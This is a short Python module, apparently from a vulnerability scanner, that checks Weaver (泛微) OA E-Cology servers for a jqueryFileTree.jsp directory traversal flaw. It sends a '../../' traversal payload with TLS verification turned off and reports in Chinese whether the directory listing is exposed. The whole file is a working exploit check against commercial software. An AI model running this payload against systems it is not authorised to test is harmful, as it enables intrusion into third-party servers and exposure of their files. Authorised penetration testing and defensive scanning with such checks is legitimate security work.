import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 泛微OA_jquery_filetree(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    exp_url = urldata + 'hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../'

    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=exp_url, headers=headers, verify=False, timeout=15)
        if response.status_code == 200 and 'index.jsp' in response.text:
            print(Vcolors.RED + "[!] 存在泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞\r" + Vcolors.ENDC)

        else:
            print(Vcolors.WARNING + "[x] 不存在泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞" + Vcolors.ENDC)

    except:
        logging.error("泛微OA_jquery_filetree脚本出现异常")

